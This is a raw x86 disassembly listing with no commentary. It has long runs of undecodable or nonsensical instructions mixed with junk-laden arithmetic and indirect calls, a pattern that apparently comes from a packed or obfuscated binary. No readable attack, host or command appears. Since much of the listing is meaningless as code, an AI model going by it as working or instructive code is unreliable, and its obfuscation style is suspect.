  4124c0:	stos   BYTE PTR es:[edi],al
  4124c1:	gs hlt 
  4124c3:	test   esp,eax
  4124c5:	int3   
  4124c6:	and    DWORD PTR [esp+edx*4+0x75],ecx
  4124ca:	xor    DWORD PTR [esi+eax*8+0xe],edx
  4124ce:	cmp    dh,dl
  4124d0:	test   eax,0xe841d0bb
  4124d5:	sub    al,0xb9
  4124d7:	mov    ebx,0x3bab53bb
  4124dc:	jns    0x41248d
  4124de:	push   0xffffffaf
  4124e0:	fsubrp st(1),st
  4124e2:	loope  0x4124eb
  4124e4:	mov    cl,0x1a
  4124e6:	leave  
  4124e7:	dec    ecx
  4124e8:	mov    ch,0x69
  4124ea:	mov    dl,0x5c
  4124ec:	and    esi,DWORD PTR [ebx]
  4124ee:	imul   eax,ecx,0x5e7811c8
  4124f4:	push   es
  4124f5:	dec    edx
  4124f6:	outs   dx,BYTE PTR ds:[esi]
  4124f7:	outs   dx,BYTE PTR ds:[esi]
  4124f8:	mov    ds:0xd63c9c2e,eax
  4124fd:	lods   al,BYTE PTR ds:[esi]
  4124fe:	mov    bh,0x16
  412500:	cmp    ebx,ebp
  412502:	cli    
  412503:	or     BYTE PTR [ecx-0x11],dl
  412506:	mov    ss,ebp
  412508:	and    ebp,DWORD PTR [ebp+0x64]
  41250b:	or     al,0xe6
  41250d:	addr16 jl 0x412515
  412510:	ins    BYTE PTR es:[edi],dx
  412511:	fdiv   DWORD PTR [edx+0x3293bede]
  412517:	out    dx,al
  412518:	mov    edi,esi
  41251a:	fwait
  41251b:	and    dl,BYTE PTR [ebp+0x2e]
  41251e:	mov    ss,WORD PTR [edx+0x517b59df]
  412524:	fild   DWORD PTR [ebx]
  412526:	dec    edi
  412527:	nop
  412528:	jmp    0x54b9:0x58c28a6f
  41252f:	xor    al,0x99
  412531:	mov    DWORD PTR [edx],esi
  412533:	mov    DWORD PTR ss:[eax+ecx*8+0x2bb23770],esi
  41253b:	adc    al,0xcb
  41253d:	adc    bh,BYTE PTR [ecx+ecx*4-0x13]
  412541:	rcl    edx,cl
  412543:	push   0x59fa48fb
  412548:	out    0xe4,eax
  41254a:	pop    ecx
  41254b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41254c:	jge    0x412566
  41254e:	pop    ecx
  41254f:	and    ebx,esi
  412551:	xor    DWORD PTR [ecx],0x11d761a5
  412557:	xchg   BYTE PTR [ebp-0x7],ch
  41255a:	adc    BYTE PTR [esi-0x25ebad9],ah
  412560:	cs mov dh,0x4c
  412563:	fsubrp st(0),st
  412565:	loope  0x4125af
  412567:	jne    0x4125b7
  412569:	rol    BYTE PTR [eax],0x7a
  41256c:	sti    
  41256d:	(bad)  
  41256e:	aam    0x37
  412570:	pop    ebx
  412571:	pusha  
  412572:	push   edx
  412573:	jae    0x412506
  412575:	push   0xffffffb2
  412577:	dec    esp
  412578:	rcl    ah,1
  41257a:	in     eax,0xfb
  41257c:	mov    al,ds:0x2efceb4e
  412581:	pop    edi
  412582:	sub    DWORD PTR [edi-0x55f298e8],ecx
  412588:	mov    eax,0xbaa353a5
  41258d:	and    cl,ah
  41258f:	out    0x42,al
  412591:	out    dx,al
  412592:	pop    edx
  412593:	cmp    DWORD PTR [ecx+ecx*4],ecx
  412596:	mov    ebx,DWORD PTR [edi-0x11]
  412599:	arpl   WORD PTR [eax],cx
  41259b:	xchg   ebp,eax
  41259c:	int3   
  41259d:	sbb    ah,bh
  41259f:	aaa    
  4125a0:	sahf   
  4125a1:	push   esi
  4125a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125a3:	mov    bl,0xad
  4125a5:	mov    al,0x5c
  4125a7:	or     edx,DWORD PTR [ecx]
  4125a9:	mov    ebp,0x6be2ae69
  4125ae:	xchg   ebx,eax
  4125af:	or     BYTE PTR [ecx+eiz*1+0x2f],dh
  4125b3:	arpl   WORD PTR [edx],cx
  4125b5:	push   ecx
  4125b6:	or     al,0x4b
  4125b8:	out    0xdc,al
  4125ba:	scas   al,BYTE PTR es:[edi]
  4125bb:	std    
  4125bc:	push   ebx
  4125bd:	push   edx
  4125be:	in     al,0xe9
  4125c0:	js     0x4125b3
  4125c2:	xchg   edi,ebx
  4125c4:	fbstp  TBYTE PTR [ecx-0x15]
  4125c7:	push   ds
  4125c8:	or     DWORD PTR [ebx-0x41d454f4],0xf44e948a
  4125d2:	inc    ebp
  4125d3:	jbe    0x41260a
  4125d5:	mov    ds:0x25d10ffe,eax
  4125da:	pop    edi
  4125db:	sub    al,0xcb
  4125dd:	inc    esp
  4125de:	test   al,0x92
  4125e0:	jno    0x412647
  4125e2:	mov    edx,0x7fa9e0cb
  4125e7:	mov    cl,0xa5
  4125e9:	adc    bl,BYTE PTR [ebp+0x4627592c]
  4125ef:	inc    edi
  4125f0:	pop    ss
  4125f1:	into   
  4125f2:	out    dx,al
  4125f3:	call   0x1ffc0e8f
  4125f8:	sahf   
  4125f9:	cld    
  4125fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125fb:	mov    cl,BYTE PTR [edi+0x22]
  4125fe:	js     0x412588
  412600:	imul   edi,DWORD PTR [edx],0x24
  412603:	add    ch,BYTE PTR [bx+di]
  412606:	cld    
  412607:	clc    
  412608:	xchg   ebp,eax
  412609:	inc    esp
  41260a:	(bad)  [edx+0xf]
  41260d:	ss pop ss
  41260f:	dec    ebp
  412610:	add    DWORD PTR [ebp+0x6dfb07e9],ebx
  412616:	out    dx,al
  412617:	cmc    
  412618:	push   ebx
  412619:	shl    eax,cl
  41261b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41261c:	xor    DWORD PTR [ebp+0x6444c1c0],0xbcab5a30
  412626:	pop    esi
  412627:	mov    ebp,0xbdc1627c
  41262c:	mov    eax,ds:0x720e5c0e
  412631:	mov    ebp,0x2cf0ed4d
  412636:	addr16 mov edx,0x91d894e2
  41263c:	mov    bl,0xce
  41263e:	stc    
  41263f:	enter  0xcb4a,0x44
  412643:	neg    DWORD PTR [edi+0x56]
  412646:	lods   eax,DWORD PTR ds:[esi]
  412647:	and    DWORD PTR [ecx+0x50],0xffffffef
  41264b:	pop    edx
  41264c:	xor    al,0x3
  41264e:	pop    ds
  41264f:	pop    edx
  412650:	push   cs
  412651:	mov    cl,0x5a
  412653:	(bad)  
  412654:	mov    al,0x9d
  412656:	sbb    DWORD PTR [ebp+0x52],ebx
  412659:	adc    eax,DWORD PTR [ecx+0x62]
  41265c:	or     eax,0x866a5f6b
  412661:	mov    edx,0xab4ca093
  412666:	addr16 loop 0x4126d7
  412669:	sbb    DWORD PTR [ebp+ebp*8-0x21db94ad],esp
  412670:	jns    0x412632
  412672:	outs   dx,BYTE PTR ds:[esi]
  412673:	mov    ah,0xeb
  412675:	es pop ss
  412677:	cmc    
  412678:	loopne 0x4126a1
  41267a:	retf   0xeae0
  41267d:	mov    ebp,0x705e5769
  412682:	xchg   ebx,eax
  412683:	jns    0x412676
  412685:	or     DWORD PTR [ecx+0x4a],ebp
  412688:	ins    BYTE PTR es:[edi],dx
  412689:	stos   DWORD PTR es:[edi],eax
  41268a:	mov    edx,0x3157560c
  41268f:	adc    eax,0x4284f5
  412694:	mov    eax,DWORD PTR [ebp+0x8]
  412697:	add    ebx,DWORD PTR ds:0x4282f1
  41269d:	mov    ecx,DWORD PTR [ebp+0xc]
  4126a0:	and    ebx,DWORD PTR ds:0x4284e9
  4126a6:	shrd   eax,ecx,0x2
  4126aa:	xor    esi,DWORD PTR ds:0x428505
  4126b0:	shr    ecx,0x2
  4126b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4126b6:	cmp    DWORD PTR ds:0x42846d,0x0
  4126bd:	not    ebx
  4126bf:	mov    edi,0x75d4
  4126c4:	mov    DWORD PTR ds:0x4284fd,0x68f
  4126ce:	mov    DWORD PTR ds:0x428509,0x72ee
  4126d8:	jmp    0x412740
  4126dd:	mov    esi,DWORD PTR ds:0x4283b9
  4126e3:	mov    DWORD PTR ds:0x428309,0x6012
  4126ed:	cmp    DWORD PTR ds:0x42846d,0x0
  4126f4:	jg     0x41272a
  4126fa:	push   0x1b53
  4126ff:	push   0x62ef
  412704:	call   DWORD PTR ds:0x42e008
  41270a:	and    edi,0x6509
  412710:	xor    edx,edx
  412712:	add    edx,DWORD PTR ds:0x428501
  412718:	and    edx,DWORD PTR ds:0x4284a1
  41271e:	mov    DWORD PTR ds:0x428501,edx
  412724:	and    edi,DWORD PTR ds:0x4282f1
  41272a:	adc    DWORD PTR ds:0x4282d9,edi
  412730:	add    DWORD PTR ds:0x428511,edi
  412736:	mov    DWORD PTR ds:0x428409,0x7a33
  412740:	mov    edx,DWORD PTR [ebp+0xc]
  412743:	cmp    DWORD PTR ds:0x4283e9,0x0
  41274a:	mov    DWORD PTR ds:0x4282d1,0x5b58
  412754:	not    ebx
  412756:	mov    DWORD PTR ds:0x4283fd,0x50a2
  412760:	mov    DWORD PTR ds:0x4283d1,edx
  412766:	jmp    0x4127b4
  41276b:	mov    DWORD PTR ds:0x428509,0x3c96
  412775:	cmp    DWORD PTR ds:0x4283e9,0x0
  41277c:	jne    0x41279e
  412782:	push   0x428255
  412787:	push   DWORD PTR [ebp-0x1c]
  41278a:	call   DWORD PTR ds:0x42e0cc
  412790:	and    DWORD PTR ds:0x4283d1,edi
  412796:	neg    DWORD PTR ds:0x4282e5
  41279c:	not    edi
  41279e:	sbb    DWORD PTR ds:0x42830d,edx
  4127a4:	sub    edi,ebx
  4127a6:	or     DWORD PTR ds:0x4283e9,ebx
  4127ac:	xor    esi,esi
  4127ae:	or     DWORD PTR ds:0x4282d5,ecx
  4127b4:	xor    edx,edx
  4127b6:	mov    esi,0x32de6d5d
  4127bb:	sub    DWORD PTR ds:0x4282fd,ecx
  4127c1:	xor    eax,esi
  4127c3:	or     eax,edx
  4127c5:	mov    DWORD PTR [ebp-0x34],eax
  4127c8:	cmp    DWORD PTR ds:0x4283e9,0x0
  4127cf:	not    ebx
  4127d1:	mov    edx,0x6453
  4127d6:	mov    ebx,DWORD PTR ds:0x42840d
  4127dc:	mov    edi,DWORD PTR ds:0x4282fd
  4127e2:	jmp    0x412823
  4127e7:	mov    edi,0x4ae9
  4127ec:	cmp    DWORD PTR ds:0x4283e9,0x0
  4127f3:	jbe    0x41280b
  4127f9:	push   0x428309
  4127fe:	call   DWORD PTR ds:0x42e254
  412804:	and    ebx,DWORD PTR ds:0x4283c5
  41280a:	inc    edx
  41280b:	adc    edx,0x18bc
  412811:	mov    ebx,DWORD PTR ds:0x428489
  412817:	or     ebx,DWORD PTR ds:0x4283e1
  41281d:	mov    DWORD PTR ds:0x428489,ebx
  412823:	mov    eax,DWORD PTR [ebp+0x8]
  412826:	shl    ecx,0x1e
  412829:	mov    ecx,DWORD PTR [ebp+0xc]
  41282c:	shrd   eax,ecx,0x2
  412830:	xor    eax,esi
  412832:	add    DWORD PTR ds:0x4283d9,0x71c1
  41283c:	shr    ecx,0x2
  41283f:	cmp    DWORD PTR ds:0x428499,0x0
  412846:	mov    DWORD PTR ds:0x4283c1,0x17f6
  412850:	mov    DWORD PTR ds:0x4283c5,ecx
  412856:	jmp    0x41291d
  41285b:	movzx  ecx,WORD PTR ds:0x42847d
  412862:	cmp    DWORD PTR ds:0x428499,0x0
  412869:	jl     0x412892
  41286f:	push   DWORD PTR [ebp-0x10]
  412872:	call   DWORD PTR ds:0x42e0d0
  412878:	sub    DWORD PTR ds:0x4283bd,edi
  41287e:	xor    edx,edx
  412880:	or     edx,DWORD PTR ds:0x428365
  412886:	mov    edi,DWORD PTR ds:0x4284c5
  41288c:	sub    edx,edi
  41288e:	sub    edx,DWORD PTR [edx+edi*1]
  412891:	inc    edx
  412892:	inc    edx
  412893:	or     DWORD PTR ds:0x428465,0x781a
  41289d:	adc    edi,DWORD PTR ds:0x4284f5
  4128a3:	sbb    ebx,DWORD PTR ds:0x428505
  4128a9:	cmp    DWORD PTR ds:0x428409,0x0
  4128b0:	mov    DWORD PTR ds:0x428495,0x3519
  4128ba:	mov    DWORD PTR ds:0x42850d,edx
  4128c0:	jmp    0x41291d
  4128c5:	mov    edi,DWORD PTR ds:0x4283e5
  4128cb:	mov    DWORD PTR ds:0x428301,0x6a8c
  4128d5:	cmp    DWORD PTR ds:0x428409,0x0
  4128dc:	jae    0x412909
  4128e2:	push   0x74d4
  4128e7:	push   DWORD PTR [ebp-0x24]
  4128ea:	call   DWORD PTR ds:0x42e00c
  4128f0:	xor    ecx,ecx
  4128f2:	or     ecx,DWORD PTR ds:0x428451
  4128f8:	mov    edi,DWORD PTR ds:0x42855d
  4128fe:	sub    ecx,edi
  412900:	add    ecx,DWORD PTR [ecx+edi*1]
  412903:	xor    DWORD PTR ds:0x4284e9,ebx
  412909:	add    DWORD PTR ds:0x4284fd,edx
  41290f:	sub    edi,DWORD PTR ds:0x428499
  412915:	neg    edx
  412917:	sub    ecx,DWORD PTR ds:0x4284f9
  41291d:	mov    ecx,DWORD PTR [ebp+0x8]
  412920:	cmp    DWORD PTR ds:0x428501,0x0
  412927:	movzx  edx,BYTE PTR ds:0x4283b1
  41292e:	mov    edi,DWORD PTR ds:0x4283f1
  412934:	jmp    0x41298c
  412939:	mov    DWORD PTR ds:0x42848d,0x3a54
  412943:	mov    DWORD PTR ds:0x4282e5,0x35a1
  41294d:	cmp    DWORD PTR ds:0x428501,0x0
  412954:	jbe    0x412981
  41295a:	push   0x731e
  41295f:	push   DWORD PTR [ebp-0x1c]
  412962:	push   0x5d33
  412967:	push   DWORD PTR [ebp-0x28]
  41296a:	push   DWORD PTR [ebp-0x20]
  41296d:	call   DWORD PTR ds:0x42e0d4
  412973:	and    edx,edi
  412975:	and    DWORD PTR ds:0x428485,ebx
  41297b:	sbb    edi,0x47ca
  412981:	inc    edx
  412982:	add    DWORD PTR ds:0x4282e5,0x615e
  41298c:	mov    edx,DWORD PTR [ebp+0xc]
  41298f:	xor    ebx,ebx
  412991:	add    ebx,DWORD PTR ds:0x428331
  412997:	mov    edi,DWORD PTR ds:0x42852d
  41299d:	sub    edi,ebx
  41299f:	or     ebx,DWORD PTR [ebx+edi*1]
  4129a2:	xor    edx,edx
  4129a4:	xor    DWORD PTR ds:0x428409,ebx
  4129aa:	or     eax,edx
  4129ac:	adc    edx,0x4918
  4129b2:	mov    DWORD PTR [ebp-0x34],eax
  4129b5:	sub    ebx,edx
  4129b7:	mov    eax,ds:0x422528
  4129bc:	mov    eax,DWORD PTR [eax]
  4129be:	mov    DWORD PTR [ebp-0x28],eax
  4129c1:	mov    eax,ds:0x422748
  4129c6:	mov    eax,DWORD PTR [eax]
  4129c8:	xor    edx,edx
  4129ca:	mov    DWORD PTR [ebp-0x20],eax
  4129cd:	mov    ebx,DWORD PTR ds:0x42843d
  4129d3:	mov    ebx,DWORD PTR [ebx]
  4129d5:	sub    DWORD PTR ds:0x42847d,ebx
  4129db:	mov    eax,DWORD PTR [ebp-0x28]
  4129de:	mov    eax,DWORD PTR [ebp-0x28]
  4129e1:	xor    edx,edx
  4129e3:	mov    ebx,DWORD PTR [ebp+0x8]
  4129e6:	movzx  edx,BYTE PTR ds:0x428475
  4129ed:	sbb    DWORD PTR ds:0x428301,edx
  4129f3:	shl    ecx,0x1e
  4129f6:	mov    edi,DWORD PTR ds:0x4282dd
  4129fc:	adc    DWORD PTR ds:0x428315,edi
  412a02:	xor    ecx,ecx
  412a04:	and    DWORD PTR ds:0x4282d5,ecx
  412a0a:	shld   ecx,eax,0x2
  412a0e:	jmp    0x412d47
  412a13:	scas   eax,DWORD PTR es:[edi]
  412a14:	cdq    
  412a15:	and    esp,ecx
  412a17:	sub    edi,DWORD PTR [eax+esi*4-0x64]
  412a1b:	push   ecx
  412a1c:	mov    edx,0x3b3790d1
  412a21:	pushf  
  412a22:	jecxz  0x412a80
  412a24:	jb     0x4129e4
  412a26:	mov    esi,0xbebec4ed
  412a2b:	ins    DWORD PTR es:[edi],dx
  412a2c:	xor    DWORD PTR [edx],0xffffff92
  412a2f:	jb     0x4129fc
  412a31:	mov    ecx,0xd6e72fbd
  412a36:	neg    DWORD PTR [esi+0x60418244]
  412a3c:	adc    BYTE PTR [ebp-0x2ebce1f],cl
  412a42:	jle    0x412a73
  412a44:	pop    ds
  412a45:	dec    dx
  412a47:	sub    ah,cl
  412a49:	shl    BYTE PTR [edi-0x3f],1
  412a4c:	pop    ecx
  412a4d:	adc    BYTE PTR ds:0xbbd45692,0xf2
  412a54:	and    BYTE PTR [ecx+0x21eeeb41],cl
  412a5a:	cmp    eax,DWORD PTR [ecx+0x277a62be]
  412a60:	mov    dh,0xb0
  412a62:	mov    esi,0xdde5d00c
  412a67:	mov    eax,ds:0xf3b971ed
  412a6c:	mov    cl,0xf8
  412a6e:	hlt    
  412a6f:	jne    0x412a6b
  412a71:	fbld   TBYTE PTR [ecx]
  412a73:	add    eax,0x2c525187
  412a78:	ss xchg edx,eax
  412a7a:	lods   al,BYTE PTR ds:[esi]
  412a7b:	xchg   ebp,eax
  412a7c:	dec    edi
  412a7d:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  412a7f:	jg     0x412a8f
  412a81:	icebp  
  412a82:	xor    dh,ah
  412a84:	or     dl,BYTE PTR [edx+0x3d]
  412a87:	mov    ecx,0x1bb46a11
  412a8c:	int3   
  412a8d:	cmc    
  412a8e:	xchg   ecx,eax
  412a8f:	inc    ecx
  412a90:	pop    ds
  412a91:	nop
  412a92:	inc    edx
  412a93:	rcr    DWORD PTR [edx],cl
  412a95:	ins    DWORD PTR es:[edi],dx
  412a96:	loopne 0x412a6b
  412a98:	push   edx
  412a99:	in     al,0x9b
  412a9b:	popf   
  412a9c:	dec    ebx
  412a9d:	clc    
  412a9e:	call   0x1b99be53
  412aa3:	or     cl,al
  412aa5:	mov    edx,DWORD PTR [ecx+ebp*1]
  412aa8:	push   esp
  412aa9:	test   BYTE PTR [eax],al
  412aab:	and    dh,0xbf
  412aae:	add    al,0x4f
  412ab0:	xchg   ecx,eax
  412ab1:	cs scas eax,DWORD PTR es:[edi]
  412ab3:	and    eax,DWORD PTR [edi-0x1e]
  412ab6:	or     dh,BYTE PTR [esi-0x7cd7963d]
  412abc:	aaa    
  412abd:	retf   0x885
  412ac0:	push   0xeadb1401
  412ac5:	jnp    0x412ada
  412ac7:	stc    
  412ac8:	out    0x45,al
  412aca:	outs   dx,DWORD PTR ds:[esi]
  412acb:	rcr    DWORD PTR [ecx],1
  412acd:	loope  0x412a8f
  412acf:	adc    al,0xd
  412ad1:	add    ebp,esp
  412ad3:	popf   
  412ad4:	xchg   edi,eax
  412ad5:	adc    esp,0xfffffffe
  412ad8:	xor    bh,ch
  412ada:	xchg   ebp,eax
  412adb:	xchg   esp,eax
  412adc:	aas    
  412add:	pushf  
  412ade:	xor    eax,0x42b9b6f4
  412ae3:	sti    
  412ae4:	xchg   ebx,eax
  412ae5:	popa   
  412ae6:	push   edi
  412ae7:	ja     0x412aa7
  412ae9:	and    al,0x8c
  412aeb:	sbb    al,al
  412aed:	test   eax,0x78fff4ca
  412af2:	stos   DWORD PTR es:[edi],eax
  412af3:	jle    0x412adb
  412af5:	lods   eax,DWORD PTR ds:[esi]
  412af6:	in     al,dx
  412af7:	jo     0x412b0a
  412af9:	jne    0x412b63
  412afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412afc:	(bad)  
  412afd:	pushf  
  412afe:	jb     0x412b4a
  412b00:	aad    0x21
  412b02:	xchg   edi,eax
  412b03:	loop   0x412af4
  412b05:	pop    edi
  412b06:	ins    DWORD PTR es:[edi],dx
  412b07:	sub    al,0xec
  412b09:	sbb    al,0xac
  412b0b:	popa   
  412b0c:	pushf  
  412b0d:	out    0x70,eax
  412b0f:	int    0x3
  412b11:	(bad)  
  412b13:	mov    dl,0x13
  412b15:	ror    DWORD PTR [edi-0x457fb13],1
  412b1b:	stos   DWORD PTR es:[edi],eax
  412b1c:	add    bl,BYTE PTR [esp+edx*1-0x5385d1aa]
  412b23:	jecxz  0x412b18
  412b25:	inc    esi
  412b26:	jecxz  0x412b64
  412b28:	and    ecx,esp
  412b2a:	cmc    
  412b2b:	and    DWORD PTR [edi],ebx
  412b2d:	loope  0x412afd
  412b2f:	aam    0xa5
  412b31:	stc    
  412b32:	fcom   st(3)
  412b34:	(bad)  
  412b35:	push   edx
  412b36:	shl    eax,0x9f
  412b39:	mov    al,0x9a
  412b3b:	lahf   
  412b3c:	jmp    0x9ccb:0xa21a65d5
  412b43:	and    DWORD PTR [ebx],0xffffffe0
  412b46:	shl    BYTE PTR ds:0x8632cd80,cl
  412b4c:	call   0xe2b2553c
  412b51:	data16 mov ds:0x841fedc2,al
  412b57:	call   0x4930f768
  412b5c:	xchg   DWORD PTR [edi-0x5b4f209a],ecx
  412b62:	(bad)  [ecx-0x71]
  412b65:	add    al,0xc5
  412b67:	jecxz  0x412b00
  412b69:	(bad)  
  412b6a:	rol    BYTE PTR [eax+0x7fcd04fc],1
  412b70:	mov    ecx,0xc61ca7dc
  412b75:	sub    ch,BYTE PTR [edx+esi*8-0x6c2e8362]
  412b7c:	dec    edx
  412b7d:	fcomp  QWORD PTR [eax-0x4f]
  412b80:	adc    ebp,0x626ead43
  412b86:	pop    edx
  412b87:	sar    DWORD PTR [edi+0x57],1
  412b8a:	pop    ecx
  412b8b:	iret   
  412b8c:	jg     0x412bfe
  412b8e:	sbb    DWORD PTR [edi],ebx
  412b90:	push   es
  412b91:	lds    edi,FWORD PTR [eax]
  412b93:	dec    eax
  412b94:	outs   dx,BYTE PTR ds:[esi]
  412b95:	xor    eax,0x83cb0506
  412b9a:	jmp    0x412bb0
  412b9c:	xor    BYTE PTR [ebp+0x282c97f2],dl
  412ba2:	sbb    al,0xfb
  412ba4:	daa    
  412ba5:	nop    DWORD PTR [ecx]
  412ba8:	rep stos DWORD PTR es:[edi],eax
  412baa:	out    0x92,eax
  412bac:	shr    DWORD PTR [ebx],cl
  412bae:	les    esi,FWORD PTR [esi+0x2b7d6556]
  412bb4:	pop    ds
  412bb5:	pop    esp
  412bb6:	hlt    
  412bb7:	js     0x412b5a
  412bb9:	mov    WORD PTR [edx+0x31],gs
  412bbc:	push   esp
  412bbd:	dec    ecx
  412bbe:	std    
  412bbf:	ja     0x412bec
  412bc1:	cwde   
  412bc2:	pop    ecx
  412bc3:	sub    dh,0xbb
  412bc6:	adc    ch,0xfd
  412bc9:	mov    BYTE PTR [ecx-0x3bde7fc6],al
  412bcf:	jns    0x412b5b
  412bd1:	or     al,0xf6
  412bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bd4:	out    0xe3,eax
  412bd6:	and    eax,0xe6294fc3
  412bdb:	push   esi
  412bdc:	cmp    eax,0xfbb1b289
  412be1:	mov    bl,0x7f
  412be3:	scas   eax,DWORD PTR es:[edi]
  412be4:	jns    0x412b87
  412be6:	cmp    eax,0x28746ef2
  412beb:	cld    
  412bec:	test   BYTE PTR [edx-0x64],ch
  412bef:	pop    esp
  412bf0:	dec    eax
  412bf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bf2:	adc    BYTE PTR [ecx+0x12],bl
  412bf5:	into   
  412bf6:	jae    0x412c22
  412bf8:	addr16 push ds
  412bfa:	stc    
  412bfb:	add    ebx,ecx
  412bfd:	fist   WORD PTR [edi+ecx*2+0x2963c174]
  412c04:	sbb    DWORD PTR [edi+0x6be66d48],0x19
  412c0b:	stos   DWORD PTR es:[edi],eax
  412c0c:	add    al,ch
  412c0e:	xor    bh,BYTE PTR [eax+ecx*2]
  412c11:	or     esi,DWORD PTR [esi+eiz*1+0x0]
  412c15:	scas   al,BYTE PTR es:[edi]
  412c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c17:	cli    
  412c18:	mov    eax,edx
  412c1a:	lods   eax,DWORD PTR ds:[esi]
  412c1b:	imul   edx,DWORD PTR [ecx*2-0xb0fd5e5],0xffffffae
  412c23:	xchg   esi,eax
  412c24:	retf   0xd471
  412c27:	and    al,0x9f
  412c29:	popa   
  412c2a:	loope  0x412bc2
  412c2c:	popf   
  412c2d:	daa    
  412c2e:	inc    edx
  412c2f:	and    BYTE PTR [edx],0xb3
  412c32:	fucomi st,st(2)
  412c34:	call   0x254d9242
  412c39:	jge    0x412c99
  412c3b:	scas   al,BYTE PTR es:[edi]
  412c3c:	add    eax,0xc6bb588a
  412c41:	xor    eax,0xb9592fda
  412c46:	pop    edx
  412c47:	or     edi,DWORD PTR [ecx-0x6d7c401a]
  412c4d:	adc    eax,0x152670bf
  412c52:	jp     0x412ca7
  412c54:	xor    DWORD PTR [edx+0x45],0xed9a8e16
  412c5b:	inc    edx
  412c5c:	ds (bad) 
  412c5f:	mov    ecx,0x768b6022
  412c64:	mov    cl,0x28
  412c66:	sub    eax,0x136b57e0
  412c6b:	cs nop
  412c6d:	rcr    BYTE PTR [ebp-0x470bf58],1
  412c73:	in     eax,dx
  412c74:	sub    esi,DWORD PTR [esi-0x338dd312]
  412c7a:	mov    esi,edi
  412c7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c7d:	(bad)  
  412c7e:	xchg   edi,eax
  412c7f:	adc    ah,bh
  412c81:	pop    edx
  412c82:	in     eax,dx
  412c83:	or     eax,0x1924d865
  412c88:	and    al,0x6d
  412c8a:	call   0xedfb8e3c
  412c8f:	sub    ecx,DWORD PTR [ebx]
  412c91:	mul    BYTE PTR [edx]
  412c93:	push   0x43
  412c95:	cmp    eax,DWORD PTR [edi]
  412c97:	out    0xf,al
  412c99:	repz xor BYTE PTR [edx-0x51],dl
  412c9d:	and    edi,DWORD PTR [ebp+0x60]
  412ca0:	test   esi,ebx
  412ca2:	in     al,dx
  412ca3:	ins    DWORD PTR es:[edi],dx
  412ca4:	mov    eax,0xe05ea01a
  412ca9:	pop    ss
  412caa:	xchg   ebp,eax
  412cab:	push   edx
  412cac:	lea    ebp,[ecx]
  412cae:	sub    DWORD PTR ds:0x70963031,ecx
  412cb4:	add    eax,ebp
  412cb6:	jns    0x412cd1
  412cb8:	loopne 0x412c89
  412cba:	inc    esp
  412cbb:	xor    dl,BYTE PTR [ebx]
  412cbd:	std    
  412cbe:	xchg   edx,eax
  412cbf:	rol    dl,cl
  412cc1:	xchg   ebp,eax
  412cc2:	gs mov esp,0x17d78930
  412cc8:	jl     0x412cbc
  412cca:	jg     0x412cd6
  412ccc:	cmp    al,0x87
  412cce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ccf:	not    BYTE PTR [ecx-0x5b]
  412cd2:	mov    ds:0x9f531ea,al
  412cd7:	rol    esp,0x7e
  412cda:	push   esi
  412cdb:	(bad)  
  412cdc:	out    0x6a,al
  412cde:	jp     0x412cf5
  412ce0:	popa   
  412ce1:	mov    ch,0x48
  412ce3:	sub    ah,ah
  412ce5:	and    al,0xd5
  412ce7:	jnp    0x412d3b
  412ce9:	jbe    0x412ccc
  412ceb:	adc    BYTE PTR [esi],dl
  412ced:	imul   esp
  412cef:	(bad)  
  412cf0:	xlat   BYTE PTR ds:[ebx]
  412cf1:	mov    esi,DWORD PTR gs:[eax]
  412cf4:	and    edx,DWORD PTR [ebx-0x33]
  412cf7:	cmp    al,0xb9
  412cf9:	xchg   edi,eax
  412cfa:	mov    dh,0x7a
  412cfc:	fwait
  412cfd:	add    al,0x4c
  412cff:	dec    edi
  412d00:	mov    ah,0x14
  412d02:	ds and ah,bl
  412d05:	imul   edi,DWORD PTR [ecx-0x4695f5be],0x9e1163e5
  412d0f:	leave  
  412d10:	sbb    eax,0xafd4d5ab
  412d15:	(bad)  
  412d16:	mov    bl,0x21
  412d18:	(bad)  
  412d19:	repz push 0x6f
  412d1c:	add    ch,BYTE PTR ds:0xe821a89b
  412d22:	pushf  
  412d23:	test   eax,0xa1ee3f36
  412d28:	sub    BYTE PTR [edi-0xb],cl
  412d2b:	jne    0x412cc1
  412d2d:	dec    ebx
  412d2e:	sbb    edx,eax
  412d30:	hlt    
  412d31:	retf   
  412d32:	lods   eax,DWORD PTR ds:[esi]
  412d33:	add    al,0x6b
  412d35:	and    ecx,esp
  412d37:	jae    0x412cfe
  412d39:	test   BYTE PTR [ebx+0x14],bl
  412d3c:	retf   0x4ea9
  412d3f:	sbb    eax,0x1a125396
  412d44:	xchg   DWORD PTR [edx],ebp
  412d46:	add    cl,al
  412d48:	loopne 0x412d4c
  412d4a:	and    edi,edi
  412d4c:	mov    edi,0xcb79b576
  412d51:	mov    edx,0x9c2b8ae8
  412d56:	mov    DWORD PTR [ebp-0x10],ebx
  412d59:	mov    DWORD PTR ds:0x428405,0xc27
  412d63:	mov    ebx,DWORD PTR [ebp+0xc]
  412d66:	xor    eax,edi
  412d68:	xor    DWORD PTR ds:0x4283cd,0x622f
  412d72:	xor    ecx,edx
  412d74:	mov    DWORD PTR ds:0x428405,0x97b
  412d7e:	mov    DWORD PTR [ebp-0x18],0xa5069aae
  412d85:	mov    DWORD PTR ds:0x42851d,0x75c6
  412d8f:	mov    DWORD PTR [ebp-0x1c],0xa50693ae
  412d96:	mov    DWORD PTR [ebp-0xc],ebx
  412d99:	mov    DWORD PTR ds:0x4284f9,0x6dfc
  412da3:	cmp    eax,DWORD PTR [ebp-0x10]
  412da6:	jne    0x412db4
  412dac:	cmp    ecx,ebx
  412dae:	je     0x414af6
  412db4:	mov    eax,DWORD PTR [ebp-0x20]
  412db7:	sub    eax,0x3b59
  412dbc:	mov    eax,DWORD PTR [ebp-0x20]
  412dbf:	xor    ecx,ecx
  412dc1:	shld   ecx,eax,0x2
  412dc5:	xor    DWORD PTR ds:0x4283b1,0x428489
  412dcf:	shl    eax,0x2
